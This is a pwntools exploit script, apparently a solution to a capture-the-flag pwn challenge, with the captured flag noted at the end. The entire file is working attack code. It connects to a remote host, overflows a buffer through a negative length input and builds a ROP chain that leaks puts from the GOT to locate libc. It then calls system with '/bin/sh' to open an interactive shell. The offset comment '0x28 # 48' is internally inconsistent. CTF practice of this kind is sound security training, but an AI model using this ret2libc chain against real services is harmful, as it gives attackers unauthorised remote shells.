from pwn import *

elf = ELF("chall")
libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
offset = 0x28  # 48
rop = ROP(elf.path)
r = remote("34.121.211.139", 3333)


def send(payload):
    r.sendlineafter("input:", "-1")
    r.recvuntil("\n")
    r.sendline(payload)
    r.recvuntil("\n")


with log.progress("leaking libc_base") as l:
    payload = b'A' * offset
    payload += p64(rop.find_gadget(['pop rdi'])[0])
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.sym['main'])
    send(payload)

    puts = u64(r.recv(6).ljust(8, b"\x00"))
    libc_base = puts - libc.sym['puts']
    system = libc_base + libc.sym['system']
    binsh = libc_base + next(libc.search(b"/bin/sh"))
    log.success(hex(libc_base))

with log.progress("spawning shell") as l:
    payload = b'A' * offset
    payload += p64(rop.find_gadget(['pop rdi'])[0])
    payload += p64(binsh)
    payload += p64(rop.find_gadget(['ret'])[0])
    payload += p64(system)
    send(payload)
    l.success()

r.interactive()

# FLAG --> shaktictf{all0c4_the_m1ghty!}
